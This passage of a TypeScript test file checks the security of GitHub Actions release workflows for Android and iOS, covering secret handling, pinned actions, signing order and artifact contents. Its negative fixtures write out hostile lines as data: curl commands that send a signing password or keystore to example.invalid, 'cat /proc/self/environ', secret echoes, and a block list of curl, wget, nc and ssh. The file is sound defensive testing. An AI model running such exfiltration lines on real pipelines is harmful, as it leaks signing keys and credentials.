    expect(upload?.with?.['uses-non-exempt-encryption']).toBe('true');
    expect(testflight.steps.some((s) => s.uses?.startsWith('apple-actions/import-codesign-certs@'))).toBe(true);
  });

  it('takes the version from package.json before building; the build number cannot repeat across runs or re-runs', () => {
    const syncName = 'Set the iOS version from package.json and the build number from the run';
    const sync = step(testflight, syncName);
    expect(sync.env).toEqual({ RUN_NUMBER: '${{ github.run_number }}', RUN_ATTEMPT: '${{ github.run_attempt }}' });
    expect(sync.run).toContain('node scripts/sync-ios-version.mjs --build-number "$((RUN_NUMBER * 100 + RUN_ATTEMPT))"');
    expect(sync.run).toContain('node scripts/sync-ios-version.mjs --check');
    const at = (name: string) => testflight.steps.findIndex((s) => s.name === name);
    expect(at(syncName)).toBeGreaterThanOrEqual(0);
    expect(at(syncName)).toBeLessThan(at('Archive the app'));
  });
});

// ---- the iOS preflight, the archive and the IPA checks: each checker returns violations so a mutated copy can be shown to be rejected ----

const IOS_PREFLIGHT_NAMES = ['IOS_DISTRIBUTION_CERT_P12_BASE64', 'IOS_DISTRIBUTION_CERT_PASSWORD', 'APPSTORE_API_PRIVATE_KEY', 'APPSTORE_ISSUER_ID', 'APPSTORE_API_KEY_ID', 'APPLE_TEAM_ID'];
const IOS_SECRET_ENV_NAMES = ['IOS_DISTRIBUTION_CERT_P12_BASE64', 'IOS_DISTRIBUTION_CERT_PASSWORD', 'APPSTORE_API_PRIVATE_KEY'];
const stepIndex = (j: Job, name: string): number => j.steps.findIndex((s) => s.name === name);

/** The preflight runs the script with all six names, and runs before the certificate is imported. */
function preflightBeforeImport(j: Job): string[] {
  const out: string[] = [];
  const at = stepIndex(j, IOS_PREFLIGHT_STEP);
  const imported = j.steps.findIndex((s) => s.uses?.startsWith('apple-actions/import-codesign-certs@') === true);
  if (at < 0) return ['no preflight step'];
  if (imported < 0) out.push('no certificate import step');
  if (imported >= 0 && at >= imported) out.push('the preflight does not run before the certificate import');
  const s = j.steps[at];
  if (s?.run?.trim() !== 'node scripts/ios-release-preflight.mjs') out.push('the preflight does not run the script');
  for (const name of IOS_PREFLIGHT_NAMES) if (!/^\$\{\{ (secrets|vars)\.[A-Z0-9_]+ \}\}$/.test(s?.env?.[name] ?? '')) out.push(`the preflight does not receive ${name}`);
  return out;
}

/** No script mentions the secrets context at all (an expression in a script is shell text), and no script reads a secret by its environment name. */
function runsHoldNoSecret(j: Job, exceptSteps: string[] = []): string[] {
  const out: string[] = [];
  for (const s of j.steps) {
    if (exceptSteps.includes(s.name ?? '')) continue;
    const run = s.run ?? '';
    if (/\bsecrets\b/.test(run)) out.push(`${s.name ?? run}: mentions secrets`);
    if (run.includes('${{')) out.push(`${s.name ?? run}: expression in run`);
  }
  return out;
}

/** Every `uses:` in the text is owner/repo@<40 hex>, whatever the loader makes of it. */
function unpinnedUses(text: string): string[] {
  return text
    .split('\n')
    .map((line) => line.replace(/\r$/, ''))
    .filter((line) => /^\s*-?\s*uses:/.test(line))
    .filter((line) => !/uses: [\w.-]+\/[\w.-]+@[0-9a-f]{40}(\s+#.*)?$/.test(line));
}

/** A step that archives or exports must hold no secret in its env and must not name one on its command line. */
function archiveLeaks(j: Job): string[] {
  const out: string[] = [];
  for (const name of ['Archive the app', 'Export the IPA']) {
    const s = j.steps.find((x) => x.name === name);
    if (s === undefined) {
      out.push(`${name}: missing`);
      continue;
    }
    if (secretsIn(s).length > 0 || JSON.stringify(s.env ?? {}).includes('secrets')) out.push(`${name}: holds a secret`);
    for (const secret of IOS_SECRET_ENV_NAMES) if ((s.run ?? '').includes(secret)) out.push(`${name}: names ${secret}`);
    if (/\bsecrets\b/.test(s.run ?? '')) out.push(`${name}: mentions secrets`);
    if (!(s.run ?? '').includes('xcodebuild')) out.push(`${name}: runs no xcodebuild`);
  }
  return out;
}

const IPA_PATH = '$RUNNER_TEMP/export/App.ipa';
/** The IPA is checked before the upload, the check fails on a missing file, and the upload reads the file the check read. */
function ipaAsserted(j: Job): string[] {
  const out: string[] = [];
  const check = j.steps.find((s) => s.name === 'Check the IPA before upload');
  const upload = j.steps.findIndex((s) => s.uses?.startsWith('apple-actions/upload-testflight-build@') === true);
  const at = stepIndex(j, 'Check the IPA before upload');
  if (check === undefined || at < 0) return ['no IPA check step'];
  if (upload < 0 || at >= upload) out.push('the IPA is not checked before the upload');
  if (!(check.run ?? '').includes(`test -f "${IPA_PATH}"`)) out.push('the check does not require the file to exist');
  if (j.steps[upload]?.with?.['app-path'] !== '${{ runner.temp }}/export/App.ipa') out.push('the upload reads another path');
  return out;
}

describe('release-ios: preflight, archive and IPA checks', () => {
  const testflight = job(ios.wf, 'testflight');

  it('runs the preflight before the certificate is imported (control: a copy with the order swapped, and one without it, are rejected)', () => {
    expect(preflightBeforeImport(testflight)).toEqual([]);
    const swapped = mutate(ios.wf, (c) => {
      const steps = job(c, 'testflight').steps;
      const a = steps.findIndex((s) => s.name === IOS_PREFLIGHT_STEP);
      const b = steps.findIndex((s) => s.uses?.startsWith('apple-actions/import-codesign-certs@') === true);
      const first = steps[a] as Step;
      steps[a] = steps[b] as Step;
      steps[b] = first;
    });
    expect(preflightBeforeImport(job(swapped, 'testflight'))).toContain('the preflight does not run before the certificate import');
    const removed = mutate(ios.wf, (c) => void (job(c, 'testflight').steps = job(c, 'testflight').steps.filter((s) => s.name !== IOS_PREFLIGHT_STEP)));
    expect(preflightBeforeImport(job(removed, 'testflight'))).toEqual(['no preflight step']);
    const missingName = mutate(ios.wf, (c) => void delete step(job(c, 'testflight'), IOS_PREFLIGHT_STEP).env?.APPLE_TEAM_ID);
    expect(preflightBeforeImport(job(missingName, 'testflight'))).toContain('the preflight does not receive APPLE_TEAM_ID');
  });

  it('hands the six names to the preflight through env only, and the preflight script names all six', () => {
    const env = step(testflight, IOS_PREFLIGHT_STEP).env ?? {};
    expect(Object.keys(env).sort()).toEqual([...IOS_PREFLIGHT_NAMES].sort());
    const script = readFileSync(join(ROOT, 'scripts', 'ios-release-preflight.mjs'), 'utf8');
    for (const name of IOS_PREFLIGHT_NAMES) expect(script, name).toContain(name);
  });

  it('no run: block interpolates or mentions a secret (control: one that does is found)', () => {
    expect(runsHoldNoSecret(testflight)).toEqual([]);
    expect(testflight.steps.filter((s) => s.run !== undefined).length).toBeGreaterThan(5);
    const leaky = mutate(ios.wf, (c) => void job(c, 'testflight').steps.push({ name: 'Added', run: 'echo ${{ secrets.APPSTORE_API_PRIVATE_KEY }}' }));
    expect(runsHoldNoSecret(job(leaky, 'testflight')).length).toBeGreaterThan(0);
    for (const j of Object.values(ios.wf.jobs)) expect(runsHoldNoSecret(j)).toEqual([]);
  });

  it('every uses: is pinned to a 40-hex commit (control: a tag and a short hash are found)', () => {
    expect(unpinnedUses(ios.text)).toEqual([]);
    expect(ios.text.split('\n').filter((l) => /^\s*-?\s*uses:/.test(l)).length).toBeGreaterThanOrEqual(6);
    expect(unpinnedUses(`${ios.text}\n      - uses: actions/checkout@v4\n`)).toHaveLength(1);
    expect(unpinnedUses(`${ios.text}\n      - uses: actions/checkout@3d3c42e\n`)).toHaveLength(1);
  });

  it('the archive and export steps pass no secret on the command line (control: a password flag is found)', () => {
    expect(archiveLeaks(testflight)).toEqual([]);
    const archive = step(testflight, 'Archive the app').run ?? '';
    for (const needle of ['xcodebuild archive', '-scheme App', '-configuration Release', "-destination 'generic/platform=iOS'", 'CODE_SIGN_STYLE=Manual', 'CODE_SIGN_IDENTITY="Apple Distribution"', 'PROVISIONING_PROFILE_SPECIFIER=', 'DEVELOPMENT_TEAM="$APPLE_TEAM_ID"', '-archivePath']) {
      expect(archive, needle).toContain(needle);
    }
    const exported = step(testflight, 'Export the IPA').run ?? '';
    for (const needle of ['xcodebuild -exportArchive', '-archivePath', '-exportPath', '-exportOptionsPlist']) expect(exported, needle).toContain(needle);
    const withPassword = mutate(ios.wf, (c) => {
      const s = step(job(c, 'testflight'), 'Archive the app');
      s.run = `${s.run ?? ''} -p12-password "$IOS_DISTRIBUTION_CERT_PASSWORD"`;
    });
    expect(archiveLeaks(job(withPassword, 'testflight'))).toContain('Archive the app: names IOS_DISTRIBUTION_CERT_PASSWORD');
    const withEnv = mutate(ios.wf, (c) => void (step(job(c, 'testflight'), 'Export the IPA').env = { KEY: '${{ secrets.APPSTORE_API_PRIVATE_KEY }}' }));
    expect(archiveLeaks(job(withEnv, 'testflight'))).toContain('Export the IPA: holds a secret');
  });

  it('asserts the Xcode major version before it archives', () => {
    const at = stepIndex(testflight, 'Require Xcode 26 or newer');
    expect(at).toBeGreaterThanOrEqual(0);
    expect(at).toBeLessThan(stepIndex(testflight, 'Archive the app'));
    const run = testflight.steps[at]?.run ?? '';
    expect(run).toContain('xcodebuild -version');
    expect(run).toMatch(/-lt 26|-ge 26/);
    expect(run).toContain('exit 1');
  });

  it('fills the options template at run time with plutil, from the profile the download step returned, without storing a team id or a profile name', () => {
    const fill = step(testflight, 'Fill in ExportOptions.plist');
    expect(fill.env).toEqual({ PROFILES: '${{ steps.profiles.outputs.profiles }}', APPLE_TEAM_ID: '${{ vars.APPLE_TEAM_ID }}' });
    const run = fill.run ?? '';
    expect(run).toContain('ios/ExportOptions.plist');
    expect(run).toContain('$RUNNER_TEMP/ExportOptions.plist');
    expect(run).toContain('plutil -replace teamID');
    // A key path would split the bundle id at its dots, so the whole mapping is replaced as JSON.
    expect(run).toContain('plutil -replace provisioningProfiles -json');
    expect(step(testflight, 'Export the IPA').run).toContain('-exportOptionsPlist "$RUNNER_TEMP/ExportOptions.plist"');
    const template = readFileSync(join(ROOT, 'ios', 'ExportOptions.plist'), 'utf8');
    expect(template).toMatch(/<key>method<\/key>\s*<string>app-store-connect<\/string>/);
    expect(template).toMatch(/<key>signingStyle<\/key>\s*<string>manual<\/string>/);
    expect(template).toMatch(/<key>teamID<\/key>\s*<string>[^<]*<\/string>/);
    expect(template).toMatch(new RegExp(String.raw`<key>provisioningProfiles</key>\s*<dict>\s*<key>${ios.wf.env?.BUNDLE_ID?.replace(/\./g, String.raw`\.`) ?? 'unset'}</key>\s*<string>[^<]*</string>`));
    // control: the template holds placeholders, not a real team id (ten characters of capitals and digits)
    expect(template).not.toMatch(/<string>[A-Z0-9]{10}<\/string>/);
  });

  it('checks the IPA contents, and asserts the file exists before the upload (control: a copy without the check, and one that reads another path, are rejected)', () => {
    expect(ipaAsserted(testflight)).toEqual([]);
    const run = step(testflight, 'Check the IPA before upload').run ?? '';
    for (const needle of ['Payload/App.app/PrivacyInfo.xcprivacy', 'Authority=Apple Distribution', 'ITSAppUsesNonExemptEncryption']) expect(run, needle).toContain(needle);
    const removed = mutate(ios.wf, (c) => void (job(c, 'testflight').steps = job(c, 'testflight').steps.filter((s) => s.name !== 'Check the IPA before upload')));
    expect(ipaAsserted(job(removed, 'testflight'))).toEqual(['no IPA check step']);
    const elsewhere = mutate(ios.wf, (c) => {
      const upload = job(c, 'testflight').steps.find((s) => s.uses?.startsWith('apple-actions/upload-testflight-build@') === true);
      if (upload?.with !== undefined) upload.with['app-path'] = 'ios/App/output/App.ipa';
    });
    expect(ipaAsserted(job(elsewhere, 'testflight'))).toContain('the upload reads another path');
    const noTest = mutate(ios.wf, (c) => void (step(job(c, 'testflight'), 'Check the IPA before upload').run = 'echo checked'));
    expect(ipaAsserted(job(noTest, 'testflight'))).toContain('the check does not require the file to exist');
  });
});

// ---- negative fixtures: a mutated copy of the parsed workflow (or of its text) must be rejected ----

describe('the checkers reject what they exist to reject', () => {
  const addRun = (wf: Workflow, id: string, run: string, extra: Partial<Step> = {}): Workflow =>
    mutate(wf, (c) => {
      job(c, id).steps.push({ name: 'Added', run, ...extra });
    });

  describe('script injection', () => {
    it.each([
      '${{ github.ref_name }}',
      '${{ github.head_ref }}',
      '${{ github.event.head_commit.message }}',
      '${{ github.event.inputs.x }}',
      '${{ inputs.x }}',
    ])('rejects %s in a run, in both workflows', (expression) => {
      expect(injection(addRun(android.wf, 'build', `echo ${expression}`))).toHaveLength(1);
      expect(injection(addRun(ios.wf, 'verify', `echo ${expression}`))).toHaveLength(1);
    });

    it('rejects a custom shell, and accepts the workflows as they are', () => {
      expect(injection(addRun(android.wf, 'build', 'true', { shell: 'bash -x {0}' }))).toHaveLength(1);
      expect(injection(android.wf)).toEqual([]);
      expect(injection(ios.wf)).toEqual([]);
    });
  });

  describe('secret use', () => {
    it.each([
      ['${{ secrets }}', 'echo ${{ secrets }}'],
      ['toJSON(secrets)', 'echo ${{ toJSON(secrets) }}'],
      ['bracket syntax', "echo ${{ secrets['ANDROID_KEY_PASSWORD'] }}"],
      ['a named secret', 'echo ${{ secrets.ANDROID_KEY_PASSWORD }}'],
    ])('rejects %s in a run', (_label, run) => {
      expect(secretUse(addRun(android.wf, 'sign', run), ANDROID_SECRETS).length).toBeGreaterThan(0);
      expect(secretUse(addRun(ios.wf, 'testflight', run), IOS_SECRETS).length).toBeGreaterThan(0);
    });

    it('rejects secrets: inherit, a bare secrets expression in env, an unknown secret name, and a secret in an if', () => {
      expect(secretUse(mutate(android.wf, (c) => void (job(c, 'sign').secrets = 'inherit')), ANDROID_SECRETS)).toContain('sign: secrets key (inherit)');
      const bare = mutate(android.wf, (c) => {
        job(c, 'sign').steps.push({ name: 'Added', uses: 'x/y@v1', env: { ALL: '${{ toJSON(secrets) }}' } });
      });
      expect(secretUse(bare, ANDROID_SECRETS).length).toBeGreaterThan(0);
      const unknown = mutate(android.wf, (c) => {
        job(c, 'sign').steps.push({ name: 'Added', uses: 'x/y@v1', with: { token: '${{ secrets.OTHER }}' } });
      });
      expect(secretUse(unknown, ANDROID_SECRETS)).toContain('sign: unknown secret OTHER');
      expect(secretUse(mutate(android.wf, (c) => void (job(c, 'sign').if = "secrets.X != ''")), ANDROID_SECRETS)).toContain('sign: job if');
    });

    it('rejects a secret in the verify job, in the unsigned build job, or in a job with no environment (control: the real ones are clean)', () => {
      const leak: Step = { name: 'Added', uses: 'x/y@v1', with: { token: '${{ secrets.ANDROID_KEY_PASSWORD }}' } };
      expect(androidGating(mutate(android.wf, (c) => void job(c, 'verify').steps.push(leak)))).toContain('verify holds no secret');
      expect(androidGating(mutate(android.wf, (c) => void job(c, 'build').steps.push(leak)))).toContain('build holds no secret');
      expect(secretUse(mutate(android.wf, (c) => void delete job(c, 'sign').environment), ANDROID_SECRETS)).toContain('sign: holds a secret but names no environment');
      expect(iosGating(mutate(ios.wf, (c) => void job(c, 'verify').steps.push({ ...leak, with: { token: '${{ secrets.APPSTORE_API_PRIVATE_KEY }}' } })))).toContain('verify holds a secret');
      expect(secretUse(android.wf, ANDROID_SECRETS)).toEqual([]);
    });
  });

  describe('steps that hold a secret', () => {
    it('Android: an extra line in the signing step, or a new step holding a secret, is rejected (control: the real ones pass)', () => {
      expect(secretSteps(android.wf, ANDROID_SECRET_STEP_LINES)).toEqual([]);
      const extra = mutate(android.wf, (c) => {
        const s = step(job(c, 'sign'), 'Align-check and sign the APK (v2 and v3 signatures)');
        s.run = `${s.run ?? ''}curl -d "$ANDROID_KEY_PASSWORD" https://example.invalid\n`;
      });
      expect(secretSteps(extra, ANDROID_SECRET_STEP_LINES)).toHaveLength(1);
      const fresh = mutate(android.wf, (c) => {
        job(c, 'sign').steps.push({ name: 'Leak', env: { X: '${{ secrets.ANDROID_KEY_PASSWORD }}' }, run: 'curl -d "$X" https://example.invalid' });
      });
      expect(secretSteps(fresh, ANDROID_SECRET_STEP_LINES)).toContain('sign/Leak: a secret in env of an unlisted step');
    });

    it('iOS: a new step with a secret in env and a run that uses curl is rejected, with the same per-step rule as Android', () => {
      expect(secretSteps(ios.wf, IOS_SECRET_STEP_LINES)).toEqual([]);
      const fresh = mutate(ios.wf, (c) => {
        job(c, 'testflight').steps.push({ name: 'Leak', env: { X: '${{ secrets.APPSTORE_API_PRIVATE_KEY }}' }, run: 'curl -d "$X" https://example.invalid' });
      });
      expect(secretSteps(fresh, IOS_SECRET_STEP_LINES)).toContain('testflight/Leak: a secret in env of an unlisted step');
    });
  });

  describe('forbidden text', () => {
    it.each([
      ['bash -x', 'shell: bash -x {0}', 'bash -x'],
      ['set -x', 'set -x', 'set -x'],
      ['set -eux', 'set -eux', 'set -x'],
      ['export -p', 'export -p', 'export -p'],
      ['declare -p', 'declare -p', 'declare -p'],
      ['/proc/self/environ', 'cat /proc/self/environ', '/proc/self/environ'],
      ['::add-mask', 'echo "::add-mask::x"', '::add-mask'],
      ['ACTIONS_RUNNER_DEBUG', 'ACTIONS_RUNNER_DEBUG: true', 'ACTIONS_RUNNER_DEBUG'],
      ['ACTIONS_STEP_DEBUG', 'ACTIONS_STEP_DEBUG: true', 'ACTIONS_STEP_DEBUG'],
      ['printenv', 'printenv', 'printenv'],
      ['env pipe', 'env | sort', 'env pipe'],
      ['bare env', 'env', 'bare env'],
      ['key block', '-----BEGIN PRIVATE KEY-----', 'key block'],
    ])('rejects %s appended to either workflow', (_label, snippet, name) => {
      expect(forbiddenText(`${android.text}\n        ${snippet}\n`)).toContain(name);
      expect(forbiddenText(`${ios.text}\n        ${snippet}\n`)).toContain(name);
    });

    it('accepts the workflows as they are', () => {
      expect(forbiddenText(android.text)).toEqual([]);
      expect(forbiddenText(ios.text)).toEqual([]);
    });
  });

  describe('the Gradle wrapper does not depend on its committed mode', () => {
    it('rejects a call without chmod, and accepts chmod or sh', () => {
      expect(gradlew(android.wf)).toEqual([]);
      const bare = mutate(android.wf, (c) => void (step(job(c, 'build'), 'Build the unsigned release APK').run = './gradlew --no-daemon assembleRelease\n'));
      expect(gradlew(bare)).toHaveLength(1);
      const late = mutate(android.wf, (c) => void (step(job(c, 'build'), 'Build the unsigned release APK').run = './gradlew assembleRelease\nchmod +x ./gradlew\n'));
      expect(gradlew(late)).toHaveLength(1);
      const viaSh = mutate(android.wf, (c) => void (step(job(c, 'build'), 'Build the unsigned release APK').run = 'sh ./gradlew --no-daemon assembleRelease\n'));
      expect(gradlew(viaSh)).toEqual([]);
    });
  });

  describe('checkout and cache', () => {
    it('rejects a checkout that keeps the token, and a cache in a signing job', () => {
      for (const [wf, id] of [
        [android.wf, 'sign'],
        [ios.wf, 'testflight'],
      ] as const) {
        const keep = mutate(wf, (c) => {
          const checkout = job(c, id).steps.find((s) => s.uses?.startsWith('actions/checkout@'));
          if (checkout?.with !== undefined) delete checkout.with['persist-credentials'];
        });
        expect(hygiene(keep, [id])).toContain(`${id}: checkout keeps credentials`);
      }
      const cached = mutate(android.wf, (c) => {
        const node = job(c, 'sign').steps.find((s) => s.uses?.startsWith('actions/setup-node@'));
        if (node?.with !== undefined) node.with.cache = 'npm';
      });
      expect(hygiene(cached, ['sign'])).toContain('sign: cache in a signing job');
      expect(hygiene(android.wf, ['sign'])).toEqual([]);
      expect(hygiene(ios.wf, ['testflight'])).toEqual([]);
    });
  });

  describe('a branch run never reaches a signing key', () => {
    it('Android: the sign job and the Release job lose their tag conditions, or the build job gains an environment', () => {
      expect(androidGating(mutate(android.wf, (c) => void delete job(c, 'sign').if))).toContain('sign if');
      expect(androidGating(mutate(android.wf, (c) => void (job(c, 'sign').if = "github.event_name == 'workflow_dispatch'")))).toContain('sign if');
      expect(androidGating(mutate(android.wf, (c) => void (job(c, 'release').if = "github.ref_type == 'tag'")))).toContain('release if');
      expect(androidGating(mutate(android.wf, (c) => void (job(c, 'build').environment = 'android-release')))).toContain('build names no environment');
      expect(androidGating(mutate(android.wf, (c) => void (job(c, 'sign').needs = 'verify')))).toContain('sign needs build');
      expect(androidGating(mutate(android.wf, (c) => void (job(c, 'sign').permissions = { contents: 'write' })))).toContain('only release writes');
    });

    it('iOS: the TestFlight job loses its tag condition', () => {
      expect(iosGating(mutate(ios.wf, (c) => void delete job(c, 'testflight').if))).toContain('testflight if');
      expect(iosGating(mutate(ios.wf, (c) => void (job(c, 'testflight').if = "github.event_name == 'push'")))).toContain('testflight if');
      expect(iosGating(mutate(ios.wf, (c) => void delete job(c, 'testflight').environment))).toContain('testflight environment');
    });
  });

  describe('what the signing job uploads and in which order', () => {
    it.each(['.', '${{ runner.temp }}', '${{ runner.temp }}/', 'release/../', ''])('rejects an upload path of %j', (path) => {
      const changed = mutate(android.wf, (c) => {
        const upload = job(c, 'sign').steps.find((s) => s.uses?.startsWith('actions/upload-artifact@'));
        if (upload?.with !== undefined) upload.with.path = path;
      });
      expect(uploadPaths(changed)).toEqual([`upload path ${path}`]);
    });

    it('rejects a second upload', () => {
      const twice = mutate(android.wf, (c) => {
        const j = job(c, 'sign');
        j.steps.splice(j.steps.length - 1, 0, { uses: 'actions/upload-artifact@x', with: { path: 'release/' } });
      });
      expect(uploadPaths(twice)).toContain('expected one upload');
    });

    it('rejects sign before decode, a cleanup that is not last, a cleanup without always(), and a missing step', () => {
      const swap = (names: [string, string]) =>
        mutate(android.wf, (c) => {
          const j = job(c, 'sign');
          const a = j.steps.findIndex((s) => s.name === names[0]);
          const b = j.steps.findIndex((s) => s.name === names[1]);
          const first = j.steps[a] as Step;
          j.steps[a] = j.steps[b] as Step;
          j.steps[b] = first;
        });
      expect(signOrder(swap(['Decode the signing keystore', 'Align-check and sign the APK (v2 and v3 signatures)']))).toContain('step order');
      expect(signOrder(swap(['Select the pinned build tools', 'Decode the signing keystore']))).toContain('step order');
      expect(signOrder(swap(['Delete the keystore', 'Checksums']))).toContain('cleanup is not the last step with always()');
      expect(signOrder(mutate(android.wf, (c) => void delete (job(c, 'sign').steps[job(c, 'sign').steps.length - 1] as Step).if))).toContain('cleanup is not the last step with always()');
      expect(signOrder(mutate(android.wf, (c) => void (job(c, 'sign').steps = job(c, 'sign').steps.filter((s) => s.name !== 'Decode the signing keystore'))))).toContain('step order');
    });
  });

  describe('the iOS build number', () => {
    it('is not the run number alone', () => {
      const sync = step(job(ios.wf, 'testflight'), 'Set the iOS version from package.json and the build number from the run');
      expect(sync.run).not.toContain('"$RUN_NUMBER"');
      expect(sync.run).toContain('RUN_ATTEMPT');
    });
  });
});


// ---- allowlists of steps and actions, and what a signing job may do ----

describe('the signing jobs run exactly the steps that are listed', () => {
  const targets = [
    ['android sign', android.wf, 'sign', EXPECTED_STEPS.androidSign],
    ['android release', android.wf, 'release', EXPECTED_STEPS.androidRelease],
    ['ios testflight', ios.wf, 'testflight', EXPECTED_STEPS.iosTestflight],
  ] as const;

  it.each(targets)('%s: the real job has exactly the listed steps, in order, and nothing forbidden (control for the fixtures below)', (_n, wf, id, expected) => {
    expect(stepAllowlist(job(wf, id), expected)).toEqual([]);
    expect(signingJob(job(wf, id))).toEqual([]);
  });

  it('every job uses only the actions allowed for it, in both workflows', () => {
    expect(usesAllowlist(android.wf, ALLOWED_USES.android ?? {})).toEqual([]);
    expect(usesAllowlist(ios.wf, ALLOWED_USES.ios ?? {})).toEqual([]);
    expect(usesAllowlist(windows.wf, ALLOWED_USES.windows ?? {})).toEqual([]);
    expect(Object.keys(ALLOWED_USES.android ?? {}).sort()).toEqual(Object.keys(android.wf.jobs).sort());
    expect(Object.keys(ALLOWED_USES.ios ?? {}).sort()).toEqual(Object.keys(ios.wf.jobs).sort());
    expect(Object.keys(ALLOWED_USES.windows ?? {}).sort()).toEqual(Object.keys(windows.wf.jobs).sort());
  });

  it('only exact files reach the artifact and the Release: release/ holds one signed APK and SHA256SUMS', () => {
    expect(releaseDir(android.wf)).toEqual([]);
  });

  it('the unsigned APK checksum is recorded by the build job, and again by the signing job for what it signed', () => {
    const build = job(android.wf, 'build');
    const record = step(build, 'Record the unsigned APK checksum');
    expect(record.run).toContain('sha256sum android/app/build/outputs/apk/release/app-release-unsigned.apk');
    expect(record.run).toContain('GITHUB_STEP_SUMMARY');
    const at = (name: string) => build.steps.findIndex((s) => s.name === name);
    expect(at('Record the unsigned APK checksum')).toBeGreaterThan(at('Build the unsigned release APK'));
    expect(at('Record the unsigned APK checksum')).toBeLessThan(build.steps.findIndex((s) => s.uses?.startsWith('actions/upload-artifact@') === true));
    expect(step(job(android.wf, 'sign'), 'Verify the signature and the version').run).toContain('sha256sum unsigned/app-release-unsigned.apk');
  });

  describe('fixtures', () => {
    const cases: [string, Workflow, string][] = [
      ['android sign', android.wf, 'sign'],
      ['android release', android.wf, 'release'],
      ['ios testflight', ios.wf, 'testflight'],
    ];
    const withStep = (wf: Workflow, id: string, added: Step, at?: number) =>
      mutate(wf, (c) => {
        const steps = job(c, id).steps;
        steps.splice(at ?? steps.length - 1, 0, added);
      });

    /** Appends a line to the first script of the job; a job with no script (the Release job) gets a step holding it. */
    const appendRun = (wf: Workflow, id: string, line: string): Workflow =>
      mutate(wf, (c) => {
        const steps = job(c, id).steps;
        const s = steps.find((x) => x.run !== undefined);
        if (s === undefined) steps.push({ name: 'Added', run: line });
        else s.run = `${s.run ?? ''}\n${line}\n`;
      });

    it.each(cases)('%s: an added step is rejected by the step list, even one with no secret in its env', (_n, wf, id) => {
      const added = withStep(wf, id, { name: 'Publish', run: 'echo hello' });
      const expected = id === 'sign' ? EXPECTED_STEPS.androidSign : id === 'release' ? EXPECTED_STEPS.androidRelease : EXPECTED_STEPS.iosTestflight;
      expect(stepAllowlist(job(added, id), expected)).toHaveLength(1);
    });

    it('rejects a step that copies the keystore into the artifact directory or sends it away', () => {
      const cp = withStep(android.wf, 'sign', { name: 'Publish', run: 'cp "$RUNNER_TEMP/release-keystore.p12" release/' });
      expect(stepAllowlist(job(cp, 'sign'), EXPECTED_STEPS.androidSign)).toHaveLength(1);
      expect(signingJob(job(cp, 'sign')).length).toBeGreaterThanOrEqual(2);
      const curl = withStep(android.wf, 'sign', { name: 'Send', run: 'curl --data-binary @"$RUNNER_TEMP/release-keystore.p12" https://example.invalid' });
      expect(signingJob(job(curl, 'sign')).length).toBeGreaterThanOrEqual(2);
    });

    it.each(['curl', 'wget', 'nc', 'ncat', 'scp', 'ssh', 'cp', 'mv', 'ln', 'rsync', 'tar', 'openssl'])('rejects %s even inside an allowed step, in every signing job', (tool) => {
      for (const [, wf, id] of cases) {
        const changed = appendRun(wf, id, `${tool} a b`);
        expect(signingJob(job(changed, id)).length, id).toBeGreaterThan(0);
      }
    });

    it('rejects the keystore path in any step but the decode, sign and cleanup steps', () => {
      const changed = mutate(android.wf, (c) => {
        const s = step(job(c, 'sign'), 'Verify the signature and the version');
        s.run = `${s.run ?? ''}ls "$RUNNER_TEMP/release-keystore.p12"\n`;
      });
      expect(signingJob(job(changed, 'sign'))).toContain('Verify the signature and the version: keystore path outside its steps');
    });

    it('rejects base64 outside the decode step', () => {
      const changed = mutate(android.wf, (c) => {
        const s = step(job(c, 'sign'), 'Checksums');
        s.run = `${s.run ?? ''}\nbase64 -w0 x\n`;
      });
      expect(signingJob(job(changed, 'sign'))).toContain('Checksums: base64 outside the decode');
    });

    it.each(['GITHUB_ENV', 'GITHUB_OUTPUT', 'GITHUB_PATH'])('rejects a write to %s anywhere but the one build-tools PATH line', (file) => {
      for (const [, wf, id] of cases) {
        const changed = appendRun(wf, id, `echo x >> "$${file}"`);
        expect(signingJob(job(changed, id)).some((v) => v.endsWith('write to an environment file'))).toBe(true);
      }
      const other = mutate(android.wf, (c) => {
        const s = step(job(c, 'sign'), PATH_STEP);
        s.run = `${s.run ?? ''}echo x >> "$${file}"\n`;
      });
      expect(signingJob(job(other, 'sign')).some((v) => v.endsWith('write to an environment file'))).toBe(true);
    });

    it('accepts the one PATH line in the build-tools step (control), and rejects the same line in another step', () => {
      expect(step(job(android.wf, 'sign'), PATH_STEP).run).toContain(PATH_LINE);
      expect(signingJob(job(android.wf, 'sign'))).toEqual([]);
      const moved = mutate(android.wf, (c) => {
        const s = step(job(c, 'sign'), 'Checksums');
        s.run = `${s.run ?? ''}\n${PATH_LINE}\n`;
      });
      expect(signingJob(job(moved, 'sign'))).toContain('Checksums: write to an environment file');
    });

    it.each(['continue-on-error', 'strategy', 'defaults', 'container', 'services'])('rejects the job key %s in a signing job', (key) => {
      for (const [, wf, id] of cases) {
        const changed = mutate(wf, (c) => {
          (job(c, id) as unknown as Record<string, unknown>)[key] = key === 'continue-on-error' ? true : {};
        });
        expect(signingJob(job(changed, id))).toContain(`job key ${key}`);
      }
    });

    it('rejects continue-on-error on a step of a signing job', () => {
      const changed = mutate(android.wf, (c) => void ((step(job(c, 'sign'), 'Checksums') as unknown as Record<string, unknown>)['continue-on-error'] = true));
      expect(signingJob(job(changed, 'sign'))).toContain('Checksums: continue-on-error');
    });

    it('rejects a new action, even one pinned to a commit, until the allowlist is edited', () => {
      const pinned = 'x/y@0123456789abcdef0123456789abcdef01234567';
      for (const [, wf, id] of cases) {
        const changed = withStep(wf, id, { uses: pinned });
        const key = wf === android.wf ? 'android' : 'ios';
        expect(usesAllowlist(changed, ALLOWED_USES[key] ?? {})).toContain(`${id}: action x/y is not allowed`);
      }
      const inVerify = withStep(android.wf, 'verify', { uses: pinned }, 0);
      expect(usesAllowlist(inVerify, ALLOWED_USES.android ?? {})).toContain('verify: action x/y is not allowed');
      const swapped = mutate(android.wf, (c) => void (job(c, 'release').steps[0] = { uses: 'actions/upload-artifact@0123456789abcdef0123456789abcdef01234567' }));
      expect(usesAllowlist(swapped, ALLOWED_USES.android ?? {})).toContain('release: action actions/upload-artifact is not allowed');
    });

    it('rejects an artifact directory with an extra writer, and a Release with other files', () => {
      const extra = mutate(android.wf, (c) => {
        const verify = step(job(c, 'sign'), 'Verify the signature and the version');
        verify.run = `${verify.run ?? ''}echo x > release/extra.txt\n`;
      });
      expect(releaseDir(extra)[0]).toContain('release/ lines');
      const files = mutate(android.wf, (c) => {
        const create = step(job(c, 'release'), 'Create the draft Release');
        if (create.with !== undefined) create.with.files = 'release/*\n';
      });
      expect(releaseDir(files)).toContain('release files');
    });
  });
});

describe('CI iOS simulator job', () => {
  const sim = ci.wf.jobs['ios-simulator'];
